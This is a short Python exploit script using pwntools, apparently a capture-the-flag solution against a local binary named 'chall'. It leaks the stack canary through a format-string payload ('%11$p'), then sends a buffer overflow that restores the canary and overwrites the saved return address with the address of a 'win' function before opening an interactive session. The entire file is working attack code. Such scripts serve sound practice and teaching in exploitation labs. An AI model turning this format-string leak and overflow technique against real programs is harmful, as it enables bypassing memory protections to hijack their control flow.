#!/usr/bin/env python3

# Title:        XXX.py
# Description:  X
# Author:       bluecosmo

from pwn import *

elf = context.binary = ELF("./chall")
p = process(elf.path)

# Canary Equation
"""
      a_canary - a_rsp
6 + --------------------
         block size
"""

a_win = p64(elf.symbols["win"])

# Send format string exploit
payload = b"%11$p"
p.sendline(payload)

# Grab canary
p.recvuntil(b"Hello, ")
canary = p64(int(p.recv(18).decode(), 16))

payload = b"A" * (0x20 - 0x8) # Buffer
payload += canary # Canary
payload += b"B" * 0x8 # RBP
payload += a_win # Ret addr

p.sendline(payload)
p.interactive()
